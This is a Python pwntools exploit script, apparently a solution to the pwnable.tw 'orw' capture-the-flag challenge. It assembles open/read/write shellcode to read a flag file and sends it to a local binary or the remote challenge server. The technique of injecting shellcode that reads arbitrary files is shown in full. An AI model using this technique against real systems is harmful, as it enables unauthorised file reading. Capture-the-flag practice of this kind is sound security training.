#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./orw"

if sys.argv[1] == "l":
    io = process("./orw")
    flag = "./flag"
else:
    io = remote("chall.pwnable.tw", 10001)
    flag = "/home/orw/flag"

orw = asm(shellcraft.open(flag, 0))
orw += asm(shellcraft.read(3, 0x804a040 + 0x500, 0x100))
orw += asm(shellcraft.write(1, 0x804a040 + 0x500, 0x100))
orw += asm(shellcraft.exit(0))
#  print disasm(orw)
io.sendafter("shellcode:", orw)
print io.recv()
io.close()
